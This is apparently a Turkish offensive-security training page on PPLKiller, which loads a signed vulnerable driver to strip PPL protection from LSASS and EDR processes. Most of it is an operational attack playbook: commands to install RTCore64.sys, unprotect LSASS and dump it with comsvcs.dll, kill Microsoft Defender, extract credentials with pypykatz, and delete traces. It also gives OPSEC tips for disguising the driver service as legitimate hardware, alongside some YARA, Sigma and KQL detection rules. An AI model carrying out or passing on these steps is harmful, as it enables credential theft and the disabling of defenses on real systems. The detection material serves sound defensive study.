# PPLKiller

> **Kategori:** [7. Bellek Analizi, LSASS Dökümü ve Kasa Hasadı](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Meşru ve dijital olarak imzalanmış ancak güvenlik açığı barındıran çekirdek sürücülerini (Bring Your Own Vulnerable Driver - BYOVD) kullanarak Windows çekirdeğinde (Ring 0) çalışan LSASS ve EDR süreçlerinin `EPROCESS` yapısındaki PPL koruma baytını sıfırlayan ve korumayı tamamen devre dışı bırakan gelişmiş çekirdek manipülasyon aracı.

---

## 1. Genel Bakış ve Amaç

Windows işletim sistemlerinde `RunAsPPL` (Protected Process Light) etkinleştirildiğinde, kullanıcı modundaki (Userland / Ring 3) hiçbir süreç (SYSTEM yetkilerine sahip olsa dahi) LSASS sürecine bellek okuma veya yazma yetkisiyle bağlanamaz. Kullanıcı modundaki mantık zafiyetleri (PPLDump, PPLMedic gibi) Microsoft tarafından yayınlanan güvenlik yamalarıyla (örneğin KB5014699) zamanla kapatılmaktadır.

Bu noktada saldırganlar, Windows mimarisinin en alt ve en yetkili katmanı olan **Çekirdek Moduna (Kernel Mode / Ring 0)** yönelir. Ancak 64-bit Windows sistemlerinde Çekirdek Kodu İmza Doğrulaması (Driver Signature Enforcement - DSE) devrededir; imzasız bir çekirdek sürücüsü sisteme yüklenemez.

**`PPLKiller`**, bu engeli **BYOVD (Bring Your Own Vulnerable Driver)** taktiğiyle aşar:
1. **İmzalı Savunmasız Sürücü Yükleme:** Üreticiler (Micro-Star MSI, GIGABYTE, Dell, ASUS vb.) tarafından dijital olarak imzalanmış ancak rastgele çekirdek belleği okuma/yazma (Arbitrary Kernel Read/Write) zafiyeti barındıran eski bir sürücüyü (`RTCore64.sys`, `gdrv.sys` vb.) meşru bir Windows servisi olarak sisteme yükler.
2. **IOCTL ile Çekirdeğe Erişim:** Kullanıcı modundaki `PPLKiller.exe`, savunmasız sürücünün aygıt tanıtıcısına (`\\.\RTCore64`) özel `DeviceIoControl` (IOCTL) mesajları göndererek sürücüyü bir bellek okuma/yazma vekili (proxy) olarak kullanır.
3. **`EPROCESS` ve `PS_PROTECTION` Sıfırlama:**
   - Çekirdekteki aktif süreç bağlantılı listesini (`PsActiveProcessHead`) veya `System` sürecinden başlayarak `ActiveProcessLinks` zincirini tarar.
   - `lsass.exe` sürecine ait `EPROCESS` çekirdek yapısını bulur.
   - İlgili Windows derlemesine özgü ofsette bulunan `PS_PROTECTION` baytını okur (örneğin `0x31` = PPL WinTCB).
   - Bu baytı çekirdek seviyesinde **`0x00`** (None) değeriyle üzerine yazar.
4. **LSASS Artık Korumasızdır:** `lsass.exe` süreci anında standart bir sürece dönüşür. Operatör artık `comsvcs.dll`, `mimikatz.exe` veya `procdump.exe` gibi standart herhangi bir araçla hiçbir erişim engeliyle karşılaşmadan LSASS bellek dökümünü alabilir.
5. **Korumayı Geri Yükleme (Restoration):** Döküm tamamlandıktan sonra operatör orijinal koruma baytını çekirdeğe tekrar yazarak sistem kararlılığını korur ve ardından savunmasız sürücüyü kaldırır.

### Mimari Akış Şeması

```
┌────────────────────────────────────────────────────────────────────────┐
│                      KULLANICI ALANI (RING 3)                          │
│                                                                        │
│  [ Saldırgan / Yönetici (SYSTEM) ]                                     │
│         │                                                              │
│         ├── (1) Savunmasız İmzalı Sürücüyü Yükle (sc create / start)   │
│         │                                                              │
│         └── [ PPLKiller.exe ]                                          │
│                   │                                                    │
│                   ├── (2) CreateFile("\\\\.\\RTCore64")                │
│                   │                                                    │
│                   └── (3) DeviceIoControl(IOCTL_READ / IOCTL_WRITE) ──┐│
└───────────────────────────────────────────────────────────────────────┼┘
                                                                        │
                                      IOCTL Mesajları (Kernel R/W)      │
                                                                        ▼
┌────────────────────────────────────────────────────────────────────────┐
│                      ÇEKİRDEK ALANI (RING 0)                           │
│                                                                        │
│  [ RTCore64.sys (İmzalı Sürücü) ]                                      │
│         │                                                              │
│         └── (4) Bellek Adresleme: EPROCESS Listesi Taranır             │
│                   │                                                    │
│                   ▼                                                    │
│             [ lsass.exe EPROCESS Yapısı ]                              │
│             ┌────────────────────────────────────────────────┐         │
│             │ +0x6b8 ImageFileName : "lsass.exe"             │         │
│             │ +0x6fa Protection    : 0x31 (PPL-WinTCB)       │         │
│             └────────────────────────────────────────────────┘         │
│                   │                                                    │
│                   └── (5) Protection Baytına '0x00' Yazılır! ─────────┐│
│                                                                       ││
└───────────────────────────────────────────────────────────────────────┼┘
                                                                        │
┌───────────────────────────────────────────────────────────────────────▼┐
│  [ SONUÇ: LSASS Korumasız Hale Geldi (Type: None, Signer: None) ]      │
│                                                                        │
│  [ Saldırgan ]: Standart comsvcs.dll / Mimikatz ile Dökümü Alır!      │
└────────────────────────────────────────────────────────────────────────┘
```

### 1.1 Çekirdek `EPROCESS.Protection` Alanı ve Bitfield Yapısı

Windows 10 ve Server çekirdeğinde `PS_PROTECTION` yapısı tek bir bayttan (8-bit) oluşur ve iki farklı alanı temsil eder:

```text
Bit Düzeni:
[ 7 | 6 | 5 | 4 | 3 | 2 | 1 | 0 ]
  │   │   │   │   └───┴───┴───┴── Type (3 bit): 0=None, 1=Protected, 2=PPL
  │   │   │   │
  └───┴───┴───┴─────────────── Signer (4 bit): 0=None, 1=Authenticode, 
                                               2=CodeGen, 3=Antimalware,
                                               4=Lsa, 5=Windows, 6=WinTCB
  (1 bit ayrılmıştır / Audit)
```

Normalde RunAsPPL aktif bir LSASS süreci için bu değer:
- `Type = 2` (ProtectedProcessLight)
- `Signer = 4` (PsProtectedSignerLsa)
- Bayt değeri: `0x42` (veya WinTCB ile `0x62` / `0x31`)

`PPLKiller`, çekirdekte doğrudan bu 1 baytlık adresi `0x00` yapar. Böylece hem `Type` hem de `Signer` sıfırlanır ve işletim sisteminin Güvenlik Referans İzleyicisi (Security Reference Monitor - SRM) tüm erişim engellerini anında kaldırır.

### Neden Önemli?

| Yetenek / Özellik | Açıklama | Operasyonel Değeri |
|---|---|---|
| **Kesin ve Kalıcı Baypas** | Kullanıcı modundaki yama veya mantık açıklarına bağlı değildir; doğrudan çekirdeğe yazar. | Tüm Windows 10, 11 ve Server sürümlerinde işletim sistemi yamalarından etkilenmez. |
| **EDR Süreçlerini Etkisiz Kılma**| Yalnızca LSASS'ı değil; korumalı çalışan EDR süreçlerinin de PPL'ini sıfırlayabilir. | Defender, SentinelOne, CrowdStrike servislerini sonlandırmayı (Kill) mümkün kılar. |
| **Geri Yüklenebilirlik (Restoration)**| Döküm bittiğinde orijinal koruma baytı tekrar çekirdeğe yazılarak sistem restore edilir. | Çekirdek bütünlüğü korunur, PatchGuard (KPP) veya sistem çökmesi riski engellenir. |
| **Her Araçla Uyumlu** | LSASS korumasız kaldığı için arkasından istenen herhangi bir döküm aracı çalıştırılabilir. | `comsvcs.dll`, `procdump`, `lsassy` veya `Mimikatz` sorunsuz şekilde döküm alır. |

### Karşılaştırma Tablosu

| Kriter | PPLKiller | PPLMedic / PPLDump | EDRSandblast | Mimikatz (Mhyprot) |
|---|---|---|---|---|
| **Çalışma Seviyesi** | Çekirdek (Ring 0) | Kullanıcı (Ring 3) | Çekirdek (Ring 0) | Çekirdek (Ring 0) |
| **Kullanılan Sürücü** | RTCore64.sys / gdrv.sys | Sürücü Yok | RTCore64.sys | mhyprot2.sys (Genshin) |
| **Yama Dayanıklılığı** | Mükemmel (Çekirdek R/W) | Orta (Yama ile kapatılır) | Mükemmel | Mükemmel |
| **HVCI / Blocklist Riski**| Var (Sürücü engellenebilir) | Yok | Var | Var |
| **EDR Sürecini Öldürme**| Yapabilir | Yapamaz | Yapabilir | Yapabilir |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

```cmd
PPLKiller.exe [/install] [/disable] [/enable] [/uninstall] [/driver <yol>] [/pid <pid>]
```

### Kritik Parametre Tablosu

| Parametre | Açıklama | Örnek Kullanım |
|---|---|---|
| `/install` | Savunmasız sürücüyü Windows Servis Yöneticisi'ne kaydeder ve servisi başlatır. | `PPLKiller.exe /install` |
| `/disable` | Hedef sürecin (varsayılan: LSASS) `EPROCESS.Protection` baytını sıfırlar (`0x00`). | `PPLKiller.exe /disable` |
| `/enable` | Hedef sürecin orijinal PPL koruma baytını çekirdeğe geri yazar. | `PPLKiller.exe /enable` |
| `/uninstall` | Savunmasız sürücü servisini durdurur ve sistemden kaldırır. | `PPLKiller.exe /uninstall` |
| `/driver <yol>` | Yüklenecek savunmasız sürücünün (`RTCore64.sys`) dosya yolu. | `/driver C:\Temp\RTCore64.sys` |
| `/pid <pid>` | PPL koruması kaldırılacak özel sürecin PID numarası (EDR süreçleri için). | `/pid 1420` |
| `/name <ad>` | Süreç adı ile hedefleme (Örn: `lsass.exe`, `MsMpEng.exe`). | `/name lsass.exe` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Savunmasız Sürücüyü Yükleme ve LSASS PPL Korumasını Kaldırma

Yönetici haklarına sahip komut isteminde sürücü sisteme kaydedilir, LSASS PID'si bulunur ve çekirdekteki koruma baytı sıfırlanır.

```cmd
PPLKiller.exe /install /driver C:\Tools\RTCore64.sys
PPLKiller.exe /disable /name lsass.exe
```

**Konsol Çıktısı Analizi:**

```text
[*] PPLKiller - Kernel-mode PPL bypass via BYOVD
[*] Installing driver service 'RTCore64'... OK
[*] Starting service... OK
[*] Opening handle to driver \\.\RTCore64... Handle: 0x000000A4
[*] Searching EPROCESS for 'lsass.exe'...
[+] Found lsass.exe at EPROCESS: 0xFFFFB284C1089080 (PID: 684)
[*] Reading current PS_PROTECTION byte at offset 0x6fa...
[+] Current Protection: 0x31 (Signer: PsProtectedSignerWinTCB, Type: ProtectedProcessLight)
[*] Overwriting Protection byte with 0x00...
[+] Verification: New Protection byte is 0x00 (PsProtectedTypeNone)
[+] LSASS is now UNPROTECTED!
```

---

### Senaryo 2: PPL Kaldırıldıktan Sonra Yerel LOLBin comsvcs.dll ile Döküm Alma

PPL engeli çekirdekte sıfırlandığı için standart Windows kütüphanesi hiçbir hata vermeden tam bellek dökümü alır:

```cmd
rundll32.exe C:\Windows\System32\comsvcs.dll, #24 684 C:\Windows\Temp\lsass.dmp full
```

---

### Senaryo 3: Döküm Tamamlandıktan Sonra Orijinal PPL Korumasını Geri Yükleme

Operatör parolaları aldıktan sonra sistemin savunma bütünlüğünü eski haline getirmek için koruma baytını yeniden yazar:

```cmd
PPLKiller.exe /enable /name lsass.exe
```

**Konsol Çıktısı Analizi:**

```text
[*] Restoring PS_PROTECTION for lsass.exe...
[*] Writing 0x31 to EPROCESS 0xFFFFB284C1089080 + 0x6fa...
[+] Verification: Protection restored to 0x31 (PsProtectedSignerWinTCB)
[+] LSASS is now protected again!
```

---

### Senaryo 4: Sürücü Servisini Sistemden Temizleme

İşlem tamamlandığında adli iz bırakmamak için servis durdurulur ve sistemden silinir:

```cmd
PPLKiller.exe /uninstall
del /f /q C:\Tools\RTCore64.sys
```

---

### Senaryo 5: EDR Ajanının (Örn: Windows Defender) Korumasını Kaldırma ve Sonlandırma

Saldırgan makinede EDR'ın (`MsMpEng.exe`) PPL korumasını çekirdekte kaldırarak süreci `taskkill` ile kapatma:

```cmd
tasklist /fi "imagename eq MsMpEng.exe"
PPLKiller.exe /disable /name MsMpEng.exe
taskkill /f /im MsMpEng.exe
```

---

### Senaryo 6: Alınan Dökümün pypykatz ile Analizi

Korumasız hale getirilen LSASS'tan alınan döküm analiz makinesine taşınır ve kimlikler çıkarılır:

```bash
pypykatz lsa minidump C:\Windows\Temp\lsass.dmp
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `CreateService failed: 0x00000424 / Access Denied` | Süreç yerel yönetici veya SYSTEM haklarına sahip değil. | Komut istemini "Yönetici Olarak Çalıştır" ile açın; `whoami /priv` ile `SeLoadDriverPrivilege` yetkisini doğrulayın. |
| `A driver cannot produce this action / Driver Blocked` | Microsoft Vulnerable Driver Blocklist veya HVCI (Bellek Bütünlüğü) sürücüyü engelliyor. | Windows Defender Core Isolation / HVCI durumunu kontrol edin; engellenmemiş alternatif bir BYOVD sürücüsü (örneğin `gdrv.sys` veya `mhyprot2.sys`) kullanın. |
| `Blue Screen of Death (BSOD) / BugCheck 0x3B / 0x1E` | Windows güncellemesi sonrası `EPROCESS.Protection` ofseti değişti; yanlış bellek adresine yazıldı. | Aracın kaynak kodundaki Windows derleme (Build) ofsetlerini güncelleyin veya derleme sürümünüzü (`winver`) araca doğru iletin. |
| `DeviceIoControl failed: 0x1 / Invalid Handle` | Sürücü servisi başlatılamadı veya sembolik aygıt bağlantısı (`\\.\RTCore64`) açılamadı. | `sc query RTCore64` ile servisin çalıştığından ve antivirus tarafından izole edilmediğinden emin olun. |
| `PatchGuard (Kernel Patch Protection) Triggered` | Sürücü sadece `Protection` alanını değil, çekirdeğin korunan diğer kod sayfalarını da değiştirdi. | Yalnızca veri (Data) alanını değiştiren ve kod alanlarına (`.text`) dokunmayan sürücü konfigürasyonlarını kullanın. |
| `LSASS dump is 0 bytes` | PPL baytı sıfırlandı ancak çağıran komut isteminde `SeDebugPrivilege` açık değil. | Dökümü alan komut isteminde `whoami /priv` ile hata ayıklama yetkisinin aktif olduğunu teyit edin. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
        GÜRÜLTÜ SEVİYESİ: ÇOK YÜKSEK (SÜRÜCÜ YÜKLEME & KERNEL IOCTL)
──────────────────────────────────────────────────────────────────
[ Windows Logları ] : Event ID 7045 (Yeni Servis), Event ID 4697 (Sürücü)
[ Sysmon ]          : Event ID 6 (DriverLoaded: RTCore64.sys)
[ Çekirdek İzi ]    : EPROCESS.Protection alanının anlık 0x00 olması
[ EDR Davranışı ]   : Vulnerable Driver Hash Tespiti, HVCI Engellemesi
```

### 5.1 Bırakılan İzler (Artifacts & Event Logs)

1. **Windows System Event ID 7045 / Security Event ID 4697 (A service was installed):**
   - Sisteme yeni bir çekirdek sürücüsü servisi kaydedildiğinde oluşturulan kritik olay günlüğü. `ServiceType` değeri `Kernel Mode Driver` olarak kaydedilir.
2. **Sysmon Event ID 6 (Driver Loaded):**
   - Savunmasız sürücünün (`RTCore64.sys`, SHA256 karması ve imzalayan sertifika bilgisiyle) belleğe yüklendiği anın kaydı.
3. **Kayıt Defteri İzleri:**
   - `HKLM\SYSTEM\CurrentControlSet\Services\RTCore64` anahtarının oluşturulması.

### 5.2 Ağ ve EDR İmzaları

- **Sürücü Kara Liste Denetimi (Blocklist):** Modern EDR'lar ve Microsoft Defender WDAC (Windows Defender Application Control) ilkeleri, bilinen savunmasız sürücülerin yüklenmesini anında durdurur.
- **Davranışsal Anomali:** Bir sürücünün yüklendikten hemen sonra `lsass.exe` sürecine handle açılması ve ardından bir döküm aracının çalışması SIEM korelasyonlarında "BYOVD Credential Theft" alarmı üretir.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araçtaki Karşılığı |
|---|---|---|
| **T1003.001** | OS Credential Dumping: LSASS Memory | Çekirdekte PPL kaldırılarak LSASS dökümü alma. |
| **T1068** | Exploitation for Privilege Escalation | Savunmasız sürücü istismarı ile Ring 0 kod yürütme/bellek yazma. |
| **T1562.001** | Impair Defenses: Disable or Modify Tools | EDR ve PPL korumalarını çekirdek seviyesinde sıfırlama. |
| **T1543.003** | Create or Modify System Process: Windows Service | Sürücüyü çalıştırmak için yeni servis oluşturma. |

### 5.4 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Önlem ve Operasyonel Tavsiye |
|---|---|
| **Sürücü Yükleme İmzası (Event 7045)** | Çok bilinen `RTCore64.sys` yerine, güvenlik ürünlerinin radarında olmayan daha az bilinen veya özel imzalı savunmasız sürücüleri tercih edin. |
| **Servis Adı İmzası** | Servis adını ve görünen adını `RTCore64` yerine `IntelManagementHelper` veya `DellHardwareService` gibi meşru donanım sürücüsü isimleriyle maskeleyin. |
| **Korumayı Açık Bırakma** | Döküm bittiğinde PPL korumasını mutlaka `/enable` ile eski değerine getirin; aksi halde EDR bellek bütünlüğü taramasında alarm üretecektir. |

### 5.5 Savunma Karşılığı (Blue Team / KQL & Sigma & YARA)

**YARA Kuralı — Savunmasız RTCore64 Sürücüsü ve PPLKiller İmzası:**

```yara
rule Suspicious_PPLKiller_RTCore_BYOVD {
    meta:
        description = "Detects PPLKiller tool and RTCore64 vulnerable driver used for BYOVD attacks"
        author = "Active Directory Security Project"
        date = "2026-10-14"
        severity = "Critical"
    strings:
        $s1 = "\\\\.\\RTCore64" ascii wide nocase
        $s2 = "PPLKiller" ascii wide nocase
        $s3 = "PS_PROTECTION" ascii wide
        $s4 = "EPROCESS" ascii wide
    condition:
        2 of them
}
```

**Sigma Kuralı — Savunmasız Sürücü Yükleme Tespiti (Sysmon Event ID 6):**

```yaml
title: Vulnerable Driver Loaded for BYOVD Attack (RTCore64)
status: experimental
description: Detects the loading of known vulnerable driver RTCore64.sys used to bypass LSASS PPL.
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 6
    ImageLoaded|endswith:
      - '\RTCore64.sys'
      - '\gdrv.sys'
      - '\dbutil_2_3.sys'
  condition: selection
level: critical
```

**Microsoft Sentinel (KQL) — Şüpheli Çekirdek Sürücüsü Kurulumu:**

```kql
SecurityEvent
| where EventID == 7045
| where ServiceType == "kernel mode driver"
| where ImagePath has_any ("RTCore64", "gdrv", "mhyprot", "dbutil")
| project TimeGenerated, Computer, SubjectUserName, ServiceName, ImagePath
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: Savunmasız Sürücüyü Sisteme Yükleme
```cmd
PPLKiller.exe /install /driver C:\Tools\RTCore64.sys
```
- **Ne Yapar?** Belirtilen imzalı sürücüyü Windows Servis Yöneticisi'ne kaydeder ve servisi başlatır.
- **Ne Zaman Kullanılır?** Çekirdek seviyesinde bellek okuma/yazma kabiliyeti kazanmak için ilk adımda.
- **Parametreler:** `/install`: Servis kurulum komutu, `/driver`: Sürücü dosya yolu.

### Komut 2: LSASS PPL Korumasını Çekirdekte Sıfırlama
```cmd
PPLKiller.exe /disable /name lsass.exe
```
- **Ne Yapar?** Çekirdekte `lsass.exe` sürecinin `EPROCESS.Protection` baytını bularak `0x00` yapar.
- **Ne Zaman Kullanılır?** LSASS'tan bellek dökümü almadan hemen önce erişim engellerini kaldırmak için.
- **Parametreler:** `/disable`: Korumayı kaldırma bayrağı, `/name`: Hedef süreç adı.

### Komut 3: PID Numarası Belirterek PPL Sıfırlama
```cmd
PPLKiller.exe /disable /pid 684
```
- **Ne Yapar?** İsim araması yapmadan doğrudan belirtilen PID'nin çekirdek koruma baytını sıfırlar.
- **Ne Zaman Kullanılır?** Süreç adı gizlendiğinde veya çoklu süreç ortamlarında tam hedefleme için.
- **Parametreler:** `/pid 684`: Hedef sürecin PID numarası.

### Komut 4: Orijinal PPL Korumasını Geri Yükleme
```cmd
PPLKiller.exe /enable /name lsass.exe
```
- **Ne Yapar?** Çekirdekte sıfırlanan koruma baytını orijinal değerine (`0x31` / `0x42`) getirir.
- **Ne Zaman Kullanılır?** Döküm işlemi tamamlandıktan sonra sistem kararlılığını sağlamak için.
- **Parametreler:** `/enable`: Korumayı geri yükleme bayrağı.

### Komut 5: Sürücü Servisini Durdurma ve Kaldırma
```cmd
PPLKiller.exe /uninstall
```
- **Ne Yapar?** Çalışan sürücü servisini durdurur ve sistemden siler.
- **Ne Zaman Kullanılır?** Operasyon tamamlandığında adli kalıntı bırakmamak için.
- **Parametreler:** `/uninstall`: Servis kaldırma komutu.

### Komut 6: EDR Sürecinin Korumasını Kaldırma
```cmd
PPLKiller.exe /disable /name MsMpEng.exe
```
- **Ne Yapar?** Microsoft Defender sürecinin PPL korumasını sıfırlar.
- **Ne Zaman Kullanılır?** EDR servisini sonlandırmadan veya bellek enjeksiyonu yapmadan önce.
- **Parametreler:** `/name MsMpEng.exe`: Defender servis süreci adı.

### Komut 7: Standart comsvcs.dll ile LSASS Dökümü Alma
```cmd
rundll32.exe C:\Windows\System32\comsvcs.dll, #24 684 C:\Windows\Temp\lsass.dmp full
```
- **Ne Yapar?** PPL koruması kalktıktan sonra yerel LOLBin ile döküm alır.
- **Ne Zaman Kullanılır?** PPL sıfırlandıktan hemen sonraki veri çekme aşamasında.
- **Parametreler:** Ordinal 24 döküm komutu.

### Komut 8: Servis Durumunu Manuel Denetleme
```cmd
sc query RTCore64
```
- **Ne Yapar?** Sürücü servisinin çalışıp çalışmadığını doğrular.
- **Ne Zaman Kullanılır?** PPLKiller sürücüyü açamadığında arıza tespiti için.
- **Parametreler:** `sc query`: Servis sorgulama aracı.

### Komut 9: Alınan Dökümün pypykatz ile İncelenmesi
```bash
pypykatz lsa minidump C:\Windows\Temp\lsass.dmp
```
- **Ne Yapar?** Çevrimdışı ortamda minidump dosyasından tüm parola ve biletleri ayıklar.
- **Ne Zaman Kullanılır?** Döküm başarıyla alındıktan sonraki parola çözümleme aşamasında.
- **Parametreler:** `lsa minidump`: Pypykatz ayrıştırma motoru.

### Komut 10: Sürücü Dosyasını ve Kalıntıları Güvenli Silme
```cmd
del /f /q C:\Tools\RTCore64.sys C:\Windows\Temp\lsass.dmp
```
- **Ne Yapar?** Diskteki sürücü dosyasını ve alınan döküm dosyasını kalıcı olarak temizler.
- **Ne Zaman Kullanılır?** Saldırı tamamlandığında izleri yok etmek için.
- **Parametreler:** `/f`: Zorla sil, `/q`: Onay isteme.

---

## Kaynaklar

- **Resmi GitHub Reposu:** [RedCursorSecurityConsulting / PPLKiller](https://github.com/RedCursorSecurityConsulting/PPLKiller)
- **LOLDrivers Projesi:** [LOLDrivers / RTCore64.sys Vulnerable Driver Database](https://www.loldrivers.io/drivers/862145e1-5125-4c07-9fa4-3505c87284ad/)
- **MITRE ATT&CK Referansı:** [T1003.001 - OS Credential Dumping: LSASS Memory](https://attack.mitre.org/techniques/T1003/001/)
- **Microsoft Security Guidance:** [Driver Vulnerabilities & Driver Blocklist](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-driver-block-rules)

---

> **Önceki:** [← PPLMedic / PPLDump](./PPLMedic_PPLDump.md) · **Sonraki:** [DonPAPI →](./DonPAPI.md)
